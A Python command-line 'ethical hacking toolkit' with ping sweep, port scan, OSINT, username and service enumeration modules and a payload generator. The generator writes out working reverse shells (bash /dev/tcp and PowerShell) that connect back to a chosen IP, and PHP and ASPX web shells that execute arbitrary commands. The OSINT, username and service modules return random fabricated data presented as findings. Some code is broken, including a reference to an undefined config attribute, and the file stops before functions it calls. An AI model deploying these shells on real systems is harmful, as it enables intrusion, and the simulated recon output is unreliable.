#!/usr/bin/env python3
"""
Python Ethical Hacking Toolkit
--------------------------------------------------
A streamlined, interactive CLI tool designed for ethical hacking
and security testing. This toolkit leverages Rich and Pyfiglet
to provide an intuitive, visually appealing interface.

Features:
  • Network Scanning (Ping Sweep, Port Scan)
  • OSINT Gathering (Domain Intelligence)
  • Username Enumeration across platforms
  • Service Enumeration
  • Basic Payload Generation
  • Settings and Configuration

This script is adapted for Fedora Linux.
Version: 1.0.0
"""

# ----------------------------------------------------------------
# Dependency Check and Imports
# ----------------------------------------------------------------
import atexit
import datetime
import ipaddress
import json
import os
import random
import re
import signal
import socket
import subprocess
import sys
import threading
import time
from concurrent.futures import ThreadPoolExecutor
from dataclasses import dataclass, field
from enum import Enum
from pathlib import Path
from typing import Any, Dict, List, Optional


def install_dependencies():
    """Install required dependencies for the user."""
    required_packages = ["rich", "pyfiglet", "prompt_toolkit", "requests"]
    user = os.environ.get("SUDO_USER", os.environ.get("USER"))

    if os.geteuid() != 0:
        print(f"Installing dependencies for user: {user}")
        subprocess.check_call(
            [sys.executable, "-m", "pip", "install", "--user"] + required_packages
        )
        return

    print(f"Running as sudo. Installing dependencies for user: {user}")
    try:
        subprocess.check_call(
            ["sudo", "-u", user, sys.executable, "-m", "pip", "install", "--user"]
            + required_packages
        )
        print(f"Successfully installed dependencies for user: {user}")
    except subprocess.CalledProcessError as e:
        print(f"Failed to install dependencies: {e}")
        sys.exit(1)


try:
    import requests
    import pyfiglet
    from rich.console import Console
    from rich.text import Text
    from rich.table import Table
    from rich.panel import Panel
    from rich.prompt import Prompt, Confirm, IntPrompt
    from rich.progress import (
        Progress,
        SpinnerColumn,
        TextColumn,
        BarColumn,
        TimeElapsedColumn,
        TimeRemainingColumn,
    )
    from rich.live import Live
    from rich.align import Align
    from rich.style import Style
    from rich.markdown import Markdown
    from rich.traceback import install as install_rich_traceback

    from prompt_toolkit import prompt as pt_prompt
    from prompt_toolkit.history import FileHistory
    from prompt_toolkit.auto_suggest import AutoSuggestFromHistory
    from prompt_toolkit.styles import Style as PtStyle

except ImportError:
    print("Required libraries not found. Installing dependencies...")
    try:
        if os.geteuid() != 0:
            subprocess.check_call(
                [
                    sys.executable,
                    "-m",
                    "pip",
                    "install",
                    "--user",
                    "rich",
                    "pyfiglet",
                    "prompt_toolkit",
                    "requests",
                ]
            )
        else:
            install_dependencies()
        print("Dependencies installed successfully. Restarting script...")
        os.execv(sys.executable, [sys.executable] + sys.argv)
    except Exception as e:
        print(f"Error installing dependencies: {e}")
        print("Please install the required packages manually:")
        print("pip install rich pyfiglet prompt_toolkit requests")
        sys.exit(1)

install_rich_traceback(show_locals=True)
console = Console()


# ----------------------------------------------------------------
# Configuration & Constants
# ----------------------------------------------------------------
class AppConfig:
    VERSION = "1.0.0"
    APP_NAME = "Python Ethical Hacking Toolkit"
    APP_SUBTITLE = "Security Testing & Reconnaissance Suite"
    HOSTNAME = socket.gethostname()

    # Base directories
    BASE_DIR = Path.home() / ".toolkit"
    RESULTS_DIR = BASE_DIR / "results"
    PAYLOADS_DIR = BASE_DIR / "payloads"
    CONFIG_DIR = BASE_DIR / "config"
    HISTORY_DIR = BASE_DIR / ".toolkit_history"

    # Default settings
    DEFAULT_THREADS = 10
    DEFAULT_TIMEOUT = 30  # seconds

    # Common user agents for web requests
    USER_AGENTS = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/91.0.4472.124 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Safari/605.1.15",
        "Mozilla/5.0 (X11; Linux x86_64) Chrome/92.0.4515.107 Safari/537.36",
    ]


# Create necessary directories
for d in [
    AppConfig.BASE_DIR,
    AppConfig.RESULTS_DIR,
    AppConfig.PAYLOADS_DIR,
    AppConfig.CONFIG_DIR,
    AppConfig.HISTORY_DIR,
]:
    d.mkdir(parents=True, exist_ok=True)

# Set up file paths for command history
COMMAND_HISTORY = os.path.join(AppConfig.HISTORY_DIR, "command_history")
TARGET_HISTORY = os.path.join(AppConfig.HISTORY_DIR, "target_history")
for history_file in [COMMAND_HISTORY, TARGET_HISTORY]:
    if not os.path.exists(history_file):
        with open(history_file, "w") as f:
            pass


# ----------------------------------------------------------------
# Nord-Themed Colors
# ----------------------------------------------------------------
class NordColors:
    POLAR_NIGHT_1 = "#2E3440"
    POLAR_NIGHT_2 = "#3B4252"
    POLAR_NIGHT_3 = "#434C5E"
    POLAR_NIGHT_4 = "#4C566A"
    SNOW_STORM_1 = "#D8DEE9"
    SNOW_STORM_2 = "#E5E9F0"
    SNOW_STORM_3 = "#ECEFF4"
    FROST_1 = "#8FBCBB"
    FROST_2 = "#88C0D0"
    FROST_3 = "#81A1C1"
    FROST_4 = "#5E81AC"
    RED = "#BF616A"
    ORANGE = "#D08770"
    YELLOW = "#EBCB8B"
    GREEN = "#A3BE8C"
    PURPLE = "#B48EAD"

    # Module-specific colors
    RECONNAISSANCE = FROST_1
    ENUMERATION = FROST_2
    EXPLOITATION = RED
    UTILITIES = PURPLE


# ----------------------------------------------------------------
# Data Structures
# ----------------------------------------------------------------
@dataclass
class ScanResult:
    target: str
    timestamp: datetime.datetime = field(default_factory=datetime.datetime.now)
    port_data: Dict[int, Dict[str, str]] = field(default_factory=dict)
    os_info: Optional[str] = None


@dataclass
class OSINTResult:
    target: str
    source_type: str
    data: Dict[str, Any]
    timestamp: datetime.datetime = field(default_factory=datetime.datetime.now)


@dataclass
class UsernameResult:
    username: str
    platforms: Dict[str, bool]
    timestamp: datetime.datetime = field(default_factory=datetime.datetime.now)


@dataclass
class ServiceResult:
    service_name: str
    version: Optional[str]
    host: str
    port: int
    details: Dict[str, Any]
    timestamp: datetime.datetime = field(default_factory=datetime.datetime.now)


@dataclass
class Payload:
    name: str
    payload_type: str
    target_platform: str
    content: str
    timestamp: datetime.datetime = field(default_factory=datetime.datetime.now)


# ----------------------------------------------------------------
# Helper Functions
# ----------------------------------------------------------------
def create_header() -> Panel:
    """Create a stylish header with program name using Pyfiglet."""
    fonts = ["slant", "big", "digital", "standard", "small"]
    ascii_art = ""

    # Try different fonts until a suitable one is found
    for font in fonts:
        try:
            fig = pyfiglet.Figlet(font=font, width=80)
            ascii_art = fig.renderText(AppConfig.APP_NAME)
            if ascii_art.strip():
                break
        except Exception:
            continue

    # Fallback if no font works
    if not ascii_art.strip():
        ascii_art = AppConfig.APP_NAME

    # Style the ASCII art with Nord colors
    lines = ascii_art.splitlines()
    styled_lines = ""
    colors = [NordColors.RED, NordColors.FROST_2, NordColors.PURPLE]

    for i, line in enumerate(lines):
        color = colors[i % len(colors)]
        escaped_line = line.replace("[", "\\[").replace("]", "\\]")
        styled_lines += f"[bold {color}]{escaped_line}[/]\n"

    border = f"[{NordColors.FROST_3}]{'═' * 80}[/]"
    content = f"{border}\n{styled_lines}{border}"

    return Panel(
        Text.from_markup(content),
        border_style=Style(color=NordColors.FROST_1),
        padding=(1, 2),
        title=f"[bold {NordColors.SNOW_STORM_2}]v{AppConfig.VERSION}[/]",
        title_align="right",
        subtitle=f"[bold {NordColors.SNOW_STORM_1}]{AppConfig.SUBTITLE}[/]",
        subtitle_align="center",
    )


def display_panel(
    message: str, style: str = NordColors.FROST_2, title: Optional[str] = None
) -> None:
    """Display a styled panel with message."""
    panel = Panel(
        Text.from_markup(f"[bold {style}]{message}[/]"),
        border_style=style,
        padding=(1, 2),
        title=f"[bold {style}]{title}[/]" if title else None,
    )
    console.print(panel)


def print_message(
    text: str, style: str = NordColors.FROST_2, prefix: str = "•"
) -> None:
    """Print a styled message with prefix."""
    console.print(f"[{style}]{prefix} {text}[/{style}]")


def print_success(message: str) -> None:
    """Print a success message."""
    print_message(message, NordColors.GREEN, "✓")


def print_warning(message: str) -> None:
    """Print a warning message."""
    print_message(message, NordColors.YELLOW, "⚠")


def print_error(message: str) -> None:
    """Print an error message."""
    print_message(message, NordColors.RED, "✗")


def get_user_input(prompt_text: str, password: bool = False) -> str:
    """Get input from user with styled prompt."""
    try:
        return pt_prompt(
            f"[bold {NordColors.PURPLE}]{prompt_text}:[/] ",
            is_password=password,
            history=FileHistory(COMMAND_HISTORY) if not password else None,
            auto_suggest=AutoSuggestFromHistory() if not password else None,
            style=PtStyle.from_dict({"prompt": f"bold {NordColors.PURPLE}"}),
        )
    except (KeyboardInterrupt, EOFError):
        console.print(f"\n[{NordColors.RED}]Input cancelled by user[/]")
        return ""


def get_confirmation(prompt_text: str) -> bool:
    """Get yes/no confirmation from user."""
    try:
        return Confirm.ask(f"[bold {NordColors.FROST_2}]{prompt_text}[/]")
    except (KeyboardInterrupt, EOFError):
        console.print(f"\n[{NordColors.RED}]Confirmation cancelled by user[/]")
        return False


def get_integer_input(
    prompt_text: str, min_value: int = None, max_value: int = None
) -> int:
    """Get integer input from user with range validation."""
    try:
        return IntPrompt.ask(
            f"[bold {NordColors.FROST_2}]{prompt_text}[/]",
            min_value=min_value,
            max_value=max_value,
        )
    except (KeyboardInterrupt, EOFError):
        console.print(f"\n[{NordColors.RED}]Input cancelled by user[/]")
        return -1


def display_progress(
    total: int, description: str, color: str = NordColors.FROST_2
) -> (Progress, int):
    """Create and return a Progress object for tracking operations."""
    progress = Progress(
        SpinnerColumn("dots", style=f"bold {color}"),
        TextColumn(f"[bold {color}]{{task.description}}"),
        BarColumn(bar_width=40, style=NordColors.FROST_4, complete_style=color),
        TextColumn(
            "[bold {0}]{{task.percentage:>3.0f}}%".format(NordColors.SNOW_STORM_1)
        ),
        TimeRemainingColumn(),
        console=console,
    )
    progress.start()
    task = progress.add_task(description, total=total)
    return progress, task


def save_result_to_file(result: Any, filename: str) -> bool:
    """Save a result object to a JSON file."""
    try:
        filepath = AppConfig.RESULTS_DIR / filename

        # Convert to a serializable dict based on dataclass type
        if isinstance(result, ScanResult):
            result_dict = {
                "target": result.target,
                "timestamp": result.timestamp.isoformat(),
                "port_data": result.port_data,
                "os_info": result.os_info,
            }
        elif isinstance(result, OSINTResult):
            result_dict = {
                "target": result.target,
                "source_type": result.source_type,
                "data": result.data,
                "timestamp": result.timestamp.isoformat(),
            }
        elif isinstance(result, UsernameResult):
            result_dict = {
                "username": result.username,
                "platforms": result.platforms,
                "timestamp": result.timestamp.isoformat(),
            }
        elif isinstance(result, ServiceResult):
            result_dict = {
                "service_name": result.service_name,
                "version": result.version,
                "host": result.host,
                "port": result.port,
                "details": result.details,
                "timestamp": result.timestamp.isoformat(),
            }
        else:
            result_dict = result.__dict__

        with open(filepath, "w") as f:
            json.dump(result_dict, f, indent=2)

        print_success(f"Results saved to: {filepath}")
        return True
    except Exception as e:
        print_error(f"Failed to save results: {e}")
        return False


def get_prompt_style() -> PtStyle:
    """Return the prompt toolkit style for consistent styling."""
    return PtStyle.from_dict({"prompt": f"bold {NordColors.PURPLE}"})


# ----------------------------------------------------------------
# Module Functions
# ----------------------------------------------------------------
def network_scanning_module() -> None:
    """Network scanning module with ping sweep and port scan capabilities."""
    console.clear()
    console.print(create_header())
    display_panel(
        "Discover active hosts, open ports and services.",
        NordColors.RECONNAISSANCE,
        "Network Scanning",
    )

    # Sub-menu for scanning
    table = Table(show_header=False, box=None)
    table.add_column("Option", style=f"bold {NordColors.FROST_2}")
    table.add_column("Description", style=NordColors.SNOW_STORM_1)
    table.add_row("1", "Ping Sweep (Discover live hosts)")
    table.add_row("2", "Port Scan (Identify open ports)")
    table.add_row("0", "Return to Main Menu")
    console.print(table)

    choice = get_integer_input("Select an option", 0, 2)
    if choice == 0:
        return
    elif choice == 1:
        ping_sweep()
    elif choice == 2:
        port_scan()

    input(f"\n[{NordColors.FROST_2}]Press Enter to continue...[/]")


def ping_sweep() -> None:
    """Perform a ping sweep to discover live hosts on a network."""
    target = get_user_input("Enter target subnet (e.g., 192.168.1.0/24)")
    if not target:
        return

    live_hosts = []
    try:
        network = ipaddress.ip_network(target, strict=False)
        hosts = list(network.hosts())

        # Limit number for performance reasons
        hosts = hosts[: min(len(hosts), 100)]
        progress, task = display_progress(
            len(hosts), "Pinging hosts", NordColors.RECONNAISSANCE
        )

        with progress:

            def check_host(ip):
                try:
                    cmd = (
                        ["ping", "-n", "1", "-w", "500", str(ip)]
                        if sys.platform == "win32"
                        else ["ping", "-c", "1", "-W", "1", str(ip)]
                    )
                    if (
                        subprocess.run(
                            cmd,
                            stdout=subprocess.PIPE,
                            stderr=subprocess.PIPE,
                            timeout=1,
                        ).returncode
                        == 0
                    ):
                        live_hosts.append(str(ip))
                finally:
                    progress.update(task, advance=1)

            with ThreadPoolExecutor(max_workers=AppConfig.DEFAULT_THREADS) as executor:
                executor.map(check_host, hosts)

        progress.stop()

        if live_hosts:
            display_panel(
                f"Found {len(live_hosts)} active hosts",
                NordColors.GREEN,
                "Scan Complete",
            )
            host_table = Table(
                title="Active Hosts",
                show_header=True,
                header_style=f"bold {NordColors.FROST_1}",
            )
            host_table.add_column("IP Address", style=f"bold {NordColors.FROST_2}")
            host_table.add_column("Status", style=NordColors.GREEN)

            for ip in live_hosts:
                host_table.add_row(ip, "● ACTIVE")

            console.print(host_table)

            if get_confirmation("Save these results to file?"):
                timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
                filename = f"pingsweep_{target.replace('/', '_')}_{timestamp}.json"
                save_result_to_file(
                    {"subnet": target, "live_hosts": live_hosts}, filename
                )
        else:
            display_panel("No active hosts found.", NordColors.RED, "Scan Complete")

    except Exception as e:
        print_error(f"Ping scan error: {e}")


def port_scan() -> None:
    """Scan a target for open ports."""
    target = get_user_input("Enter target IP")
    if not target:
        return

    port_range = get_user_input(
        "Enter port range (e.g., 1-1000) or leave blank for common ports"
    )

    open_ports = {}

    # Define ports to scan
    if port_range:
        try:
            start, end = map(int, port_range.split("-"))
            ports = range(start, end + 1)
        except ValueError:
            print_error("Invalid port range. Using common ports.")
            ports = [
                21,
                22,
                23,
                25,
                53,
                80,
                110,
                443,
                445,
                1433,
                3306,
                3389,
                5900,
                8080,
            ]
    else:
        ports = [21, 22, 23, 25, 53, 80, 110, 443, 445, 1433, 3306, 3389, 5900, 8080]

    progress, task = display_progress(
        len(ports), "Scanning ports", NordColors.RECONNAISSANCE
    )

    with progress:
        for port in ports:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(0.5)
                if s.connect_ex((target, port)) == 0:
                    service = socket.getservbyport(port) if port < 1024 else "unknown"
                    open_ports[port] = {"service": service, "state": "open"}
                s.close()
            except Exception:
                pass
            finally:
                progress.update(task, advance=1)

    progress.stop()

    if open_ports:
        display_panel(
            f"Found {len(open_ports)} open ports on {target}",
            NordColors.GREEN,
            "Scan Complete",
        )
        port_table = Table(
            title="Open Ports",
            show_header=True,
            header_style=f"bold {NordColors.FROST_1}",
        )
        port_table.add_column("Port", style=f"bold {NordColors.FROST_2}")
        port_table.add_column("Service", style=NordColors.SNOW_STORM_1)
        port_table.add_column("State", style=NordColors.GREEN)

        for port, info in sorted(open_ports.items()):
            port_table.add_row(
                str(port),
                info.get("service", "unknown"),
                info.get("state", "unknown"),
            )

        console.print(port_table)

        if get_confirmation("Save these results to file?"):
            scan_result = ScanResult(target=target, port_data=open_ports)
            timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
            filename = f"portscan_{target.replace('.', '_')}_{timestamp}.json"
            save_result_to_file(scan_result, filename)
    else:
        display_panel(
            f"No open ports found on {target}", NordColors.YELLOW, "Scan Complete"
        )


def osint_gathering_module() -> None:
    """OSINT gathering module for domain intelligence."""
    console.clear()
    console.print(create_header())
    display_panel(
        "Collect publicly available intelligence on targets.",
        NordColors.RECONNAISSANCE,
        "OSINT Gathering",
    )

    domain = get_user_input("Enter target domain (e.g., example.com)")
    if not domain:
        return

    with console.status(
        f"[bold {NordColors.FROST_2}]Gathering intelligence on {domain}..."
    ):
        time.sleep(1.5)  # Simulated processing time
        result = gather_domain_info(domain)

    display_osint_result(result)

    if get_confirmation("Save these results to file?"):
        timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = f"osint_domain_{domain.replace('.', '_')}_{timestamp}.json"
        save_result_to_file(result, filename)

    input(f"\n[{NordColors.FROST_2}]Press Enter to continue...[/]")


def gather_domain_info(domain: str) -> OSINTResult:
    """Gather domain intelligence (simulated)."""
    data = {}

    # Simulate gathering domain information
    try:
        # Simulated WHOIS information
        data["whois"] = {
            "registrar": "Example Registrar, Inc.",
            "creation_date": f"{random.randint(1995, 2020)}-{random.randint(1, 12):02d}-{random.randint(1, 28):02d}",
            "expiration_date": f"{random.randint(2023, 2030)}-{random.randint(1, 12):02d}-{random.randint(1, 28):02d}",
            "status": random.choice(
                [
                    "clientTransferProhibited",
                    "clientDeleteProhibited",
                    "clientUpdateProhibited",
                ]
            ),
            "name_servers": [f"ns{i}.cloudflare.com" for i in range(1, 3)],
        }

        # Simulated DNS records
        data["dns"] = {
            "a_records": [
                f"192.0.2.{random.randint(1, 255)}" for _ in range(random.randint(1, 3))
            ],
            "mx_records": [f"mail{i}.{domain}" for i in range(1, random.randint(2, 4))],
            "txt_records": [f"v=spf1 include:_spf.{domain} ~all"],
            "ns_records": data["whois"]["name_servers"],
        }

        # Simulated SSL certificate information
        data["ssl"] = {
            "issuer": random.choice(
                ["Let's Encrypt Authority X3", "DigiCert Inc", "Sectigo Limited"]
            ),
            "valid_from": f"{random.randint(2021, 2022)}-{random.randint(1, 12):02d}-{random.randint(1, 28):02d}",
            "valid_to": f"{random.randint(2023, 2024)}-{random.randint(1, 12):02d}-{random.randint(1, 28):02d}",
            "serial_number": str(random.randint(1000000000, 9999999999)),
        }

        # Simulated subdomains
        data["subdomains"] = [f"www.{domain}", f"mail.{domain}", f"api.{domain}"]
    except Exception as e:
        print_error(f"Error gathering domain info: {e}")

    return OSINTResult(target=domain, source_type="domain_analysis", data=data)


def display_osint_result(result: OSINTResult) -> None:
    """Display OSINT results in a structured format."""
    console.print()

    # Display basic information panel
    panel = Panel(
        Text.from_markup(
            f"[bold {NordColors.FROST_2}]Target:[/] {result.target}\n"
            f"[bold {NordColors.FROST_2}]Analysis Time:[/] {result.timestamp.strftime('%Y-%m-%d %H:%M:%S')}"
        ),
        title="Domain Intelligence Report",
        border_style=NordColors.RECONNAISSANCE,
    )
    console.print(panel)

    # Display WHOIS information
    whois = result.data.get("whois", {})
    if whois:
        table = Table(
            title="WHOIS Information",
            show_header=True,
            header_style=f"bold {NordColors.FROST_1}",
        )
        table.add_column("Property", style=f"bold {NordColors.FROST_2}")
        table.add_column("Value", style=NordColors.SNOW_STORM_1)

        for key, value in whois.items():
            if key == "name_servers":
                value = ", ".join(value)
            table.add_row(key.replace("_", " ").title(), str(value))

        console.print(table)

    # Display DNS records
    dns = result.data.get("dns", {})
    if dns:
        table = Table(
            title="DNS Records",
            show_header=True,
            header_style=f"bold {NordColors.FROST_1}",
        )
        table.add_column("Record Type", style=f"bold {NordColors.FROST_2}")
        table.add_column("Value", style=NordColors.SNOW_STORM_1)

        for rtype, values in dns.items():
            table.add_row(
                rtype.upper(),
                "\n".join(values) if isinstance(values, list) else str(values),
            )

        console.print(table)

    # Display SSL certificate information
    ssl = result.data.get("ssl", {})
    if ssl:
        table = Table(
            title="SSL Certificate",
            show_header=True,
            header_style=f"bold {NordColors.FROST_1}",
        )
        table.add_column("Property", style=f"bold {NordColors.FROST_2}")
        table.add_column("Value", style=NordColors.SNOW_STORM_1)

        for key, value in ssl.items():
            table.add_row(key.replace("_", " ").title(), str(value))

        console.print(table)

    # Display subdomains
    subs = result.data.get("subdomains", [])
    if subs:
        table = Table(
            title="Subdomains",
            show_header=True,
            header_style=f"bold {NordColors.FROST_1}",
        )
        table.add_column("Subdomain", style=f"bold {NordColors.FROST_2}")

        for sub in subs:
            table.add_row(sub)

        console.print(table)

    console.print()


def username_enumeration_module() -> None:
    """Username enumeration module to check username presence across platforms."""
    console.clear()
    console.print(create_header())
    display_panel(
        "Search for a username across multiple platforms.",
        NordColors.ENUMERATION,
        "Username Enumeration",
    )

    username = get_user_input("Enter username to check")
    if not username:
        return

    result = check_username(username)
    display_username_results(result)

    if get_confirmation("Save these results to file?"):
        timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = f"username_{username}_{timestamp}.json"
        save_result_to_file(result, filename)

    input(f"\n[{NordColors.FROST_2}]Press Enter to continue...[/]")


def check_username(username: str) -> UsernameResult:
    """Simulated check for username presence across multiple platforms."""
    platforms = {
        "Twitter": f"https://twitter.com/{username}",
        "GitHub": f"https://github.com/{username}",
        "Instagram": f"https://instagram.com/{username}",
        "Reddit": f"https://reddit.com/user/{username}",
        "LinkedIn": f"https://linkedin.com/in/{username}",
    }

    results = {}
    progress, task = display_progress(
        len(platforms), "Checking platforms", NordColors.ENUMERATION
    )

    with progress:
        for platform, url in platforms.items():
            # Simulate a network delay
            time.sleep(0.3)

            # Simulate result with some randomness
            # Longer usernames are less likely to be taken
            likelihood = 0.7 if len(username) < 6 else 0.4
            results[platform] = random.random() < likelihood

            progress.update(task, advance=1)

    progress.stop()

    return UsernameResult(username=username, platforms=results)


def display_username_results(result: UsernameResult) -> None:
    """Display username enumeration results in a structured format."""
    console.print()

    panel = Panel(
        Text.from_markup(
            f"[bold {NordColors.FROST_2}]Username:[/] {result.username}\n"
            f"[bold {NordColors.FROST_2}]Time:[/] {result.timestamp.strftime('%Y-%m-%d %H:%M:%S')}"
        ),
        title="Username Enumeration Results",
        border_style=NordColors.ENUMERATION,
    )
    console.print(panel)

    table = Table(
        title="Platform Results",
        show_header=True,
        header_style=f"bold {NordColors.FROST_1}",
    )
    table.add_column("Platform", style=f"bold {NordColors.FROST_2}")
    table.add_column("Status", style=NordColors.SNOW_STORM_1)
    table.add_column("URL", style=NordColors.FROST_3)

    found_count = 0
    for platform, found in result.platforms.items():
        if found:
            found_count += 1
            status = f"[bold {NordColors.GREEN}]● FOUND[/]"
            url = f"https://{platform.lower()}.com/{result.username}"
        else:
            status = f"[dim {NordColors.RED}]○ NOT FOUND[/]"
            url = "N/A"

        table.add_row(platform, status, url)

    console.print(table)

    if found_count > 0:
        console.print(
            f"[bold {NordColors.GREEN}]Username found on {found_count} platforms.[/]"
        )
    else:
        console.print(f"[bold {NordColors.RED}]Username not found on any platforms.[/]")

    console.print()


def service_enumeration_module() -> None:
    """Service enumeration module to gather information about network services."""
    console.clear()
    console.print(create_header())
    display_panel(
        "Gather detailed information about a network service.",
        NordColors.ENUMERATION,
        "Service Enumeration",
    )

    host = get_user_input("Enter target host (IP or hostname)")
    if not host:
        return

    port = get_integer_input("Enter port number", 1, 65535)
    if port <= 0:
        return

    service = get_user_input(
        "Enter service name (optional, leave blank to auto-detect)"
    )

    with console.status(
        f"[bold {NordColors.FROST_2}]Enumerating service on {host}:{port}..."
    ):
        time.sleep(2)  # Simulated processing time
        result = enumerate_service(host, port, service if service else None)

    display_service_results(result)

    if get_confirmation("Save these results to file?"):
        timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = f"service_{host}_{port}_{timestamp}.json"
        save_result_to_file(result, filename)

    input(f"\n[{NordColors.FROST_2}]Press Enter to continue...[/]")


def enumerate_service(
    host: str, port: int, service_name: Optional[str] = None
) -> ServiceResult:
    """Simulate service enumeration."""
    # Common service ports mapping
    common_services = {
        21: "FTP",
        22: "SSH",
        23: "Telnet",
        25: "SMTP",
        53: "DNS",
        80: "HTTP",
        110: "POP3",
        143: "IMAP",
        443: "HTTPS",
        445: "SMB",
        3306: "MySQL",
        3389: "RDP",
        5432: "PostgreSQL",
        8080: "HTTP-Proxy",
    }

    # Auto-detect service if not specified
    if not service_name:
        service_name = common_services.get(port, "Unknown")

    # Simulate version information
    versions = {
        "FTP": ["vsftpd 3.0.3", "ProFTPD 1.3.5"],
        "SSH": ["OpenSSH 7.6", "OpenSSH 8.2"],
        "HTTP": ["Apache/2.4.29", "nginx/1.14.0"],
        "HTTPS": ["Apache/2.4.29 (SSL)", "nginx/1.14.0 (SSL)"],
        "MySQL": ["MySQL 5.7.32", "MySQL 8.0.21"],
    }

    version = random.choice(versions.get(service_name, ["Unknown"]))
    details = {"banner": f"{service_name} Server {version}"}

    return ServiceResult(
        service_name=service_name,
        version=version,
        host=host,
        port=port,
        details=details,
    )


def display_service_results(result: ServiceResult) -> None:
    """Display service enumeration results in a structured format."""
    console.print()

    panel = Panel(
        Text.from_markup(
            f"[bold {NordColors.FROST_2}]Service:[/] {result.service_name}\n"
            f"[bold {NordColors.FROST_2}]Version:[/] {result.version}\n"
            f"[bold {NordColors.FROST_2}]Host:[/] {result.host}:{result.port}\n"
            f"[bold {NordColors.FROST_2}]Time:[/] {result.timestamp.strftime('%Y-%m-%d %H:%M:%S')}"
        ),
        title="Service Enumeration Results",
        border_style=NordColors.ENUMERATION,
    )
    console.print(panel)

    table = Table(
        title="Service Details",
        show_header=True,
        header_style=f"bold {NordColors.FROST_1}",
    )
    table.add_column("Property", style=f"bold {NordColors.FROST_2}")
    table.add_column("Value", style=NordColors.SNOW_STORM_1)

    # Add banner information
    table.add_row("Banner", result.details.get("banner", "N/A"))

    # Add other details if available
    for key, value in result.details.items():
        if key == "banner":
            continue
        if isinstance(value, list):
            value = ", ".join(value)
        table.add_row(key.replace("_", " ").title(), str(value))

    console.print(table)
    console.print()


def payload_generation_module() -> None:
    """Generate basic reverse shells and other payloads."""
    console.clear()
    console.print(create_header())
    display_panel(
        "Generate basic payloads for testing.",
        NordColors.EXPLOITATION,
        "Payload Generation",
    )

    table = Table(show_header=False, box=None)
    table.add_column("Option", style=f"bold {NordColors.FROST_2}")
    table.add_column("Description", style=NordColors.SNOW_STORM_1)
    table.add_row("1", "Reverse Shell")
    table.add_row("2", "Web Shell")
    table.add_row("0", "Return to Main Menu")
    console.print(table)

    choice = get_integer_input("Select payload type", 0, 2)
    if choice == 0:
        return

    payload_types = {
        1: "shell_reverse",
        2: "web",
    }

    payload_type = payload_types[choice]
    platforms = []

    if payload_type == "shell_reverse":
        platforms = ["linux", "windows"]
    elif payload_type == "web":
        platforms = ["php", "aspx"]

    console.print(f"\n[bold {NordColors.FROST_2}]Available Target Platforms:[/]")
    for i, plat in enumerate(platforms, 1):
        console.print(f"  {i}. {plat.capitalize()}")

    plat_choice = get_integer_input("Select target platform", 1, len(platforms))
    if plat_choice < 1:
        return

    target_platform = platforms[plat_choice - 1]

    # Get payload customization options
    if payload_type == "shell_reverse":
        ip = get_user_input("Enter your IP address")
        port = get_integer_input("Enter listening port", 1, 65535)

        with console.status(
            f"[bold {NordColors.FROST_2}]Generating {payload_type} payload for {target_platform}..."
        ):
            time.sleep(1)  # Simulated processing time
            payload = generate_payload(payload_type, target_platform, ip, port)
    else:
        with console.status(
            f"[bold {NordColors.FROST_2}]Generating {payload_type} payload for {target_platform}..."
        ):
            time.sleep(1)  # Simulated processing time
            payload = generate_payload(payload_type, target_platform)

    display_payload(payload)

    if get_confirmation("Save this payload to file?"):
        filepath = save_payload(payload)
        print_success(f"Payload saved to {filepath}")

    input(f"\n[{NordColors.FROST_2}]Press Enter to continue...[/]")


def generate_payload(
    payload_type: str, target_platform: str, ip: str = "ATTACKER_IP", port: int = 4444
) -> Payload:
    """Generate a payload based on type and platform."""
    name = f"{payload_type}_{target_platform}_{datetime.datetime.now().strftime('%Y%m%d_%H%M%S')}"
    content = ""

    if payload_type == "shell_reverse":
        if target_platform == "linux":
            content = f"""#!/bin/bash
# Linux Reverse Shell
bash -i >& /dev/tcp/{ip}/{port} 0>&1
"""
        else:  # Windows
            content = f"""# PowerShell Reverse Shell
$client = New-Object System.Net.Sockets.TCPClient('{ip}',{port});
$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{{0}};
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
    $sendback = (iex $data 2>&1 | Out-String );
    $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
    $stream.Write($sendbyte,0,$sendbyte.Length);
    $stream.Flush();
}}
$client.Close();
"""
    elif payload_type == "web":
        if target_platform == "php":
            content = """<?php
// PHP Web Shell - For educational purposes only
if(isset($_REQUEST['cmd'])){
    echo "<pre>";
    $cmd = ($_REQUEST['cmd']);
    system($cmd);
    echo "</pre>";
    die;
}
?>
<form method="POST">
    <input type="text" name="cmd" placeholder="Command">
    <button type="submit">Execute</button>
</form>
"""
        else:  # ASPX
            content = """<%@ Page Language="C#" %>
<%@ Import Namespace="System.Diagnostics" %>
<%@ Import Namespace="System.IO" %>
<script runat="server">
    // ASPX Web Shell - For educational purposes only
    protected void btnExecute_Click(object sender, EventArgs e)
    {
        try
        {
            ProcessStartInfo psi = new ProcessStartInfo();
            psi.FileName = "cmd.exe";
            psi.Arguments = "/c " + txtCommand.Text;
            psi.RedirectStandardOutput = true;
            psi.UseShellExecute = false;
            Process p = Process.Start(psi);
            StreamReader stmrdr = p.StandardOutput;
            string output = stmrdr.ReadToEnd();
            stmrdr.Close();
            txtOutput.Text = output;
        }
        catch (Exception ex)
        {
            txtOutput.Text = "Error: " + ex.Message;
        }
    }
</script>

<html>
<head>
    <title>ASPX Shell</title>
</head>
<body>
    <form id="form1" runat="server">
        <div>
            <asp:TextBox ID="txtCommand" runat="server" Width="500px"></asp:TextBox>
            <asp:Button ID="btnExecute" runat="server" Text="Execute" OnClick="btnExecute_Click" />
            <br /><br />
            <asp:TextBox ID="txtOutput" runat="server" TextMode="MultiLine" 
                         Width="800px" Height="400px"></asp:TextBox>
        </div>
    </form>
</body>
</html>
"""

    return Payload(
        name=name,
        payload_type=payload_type,
        target_platform=target_platform,
        content=content,
    )


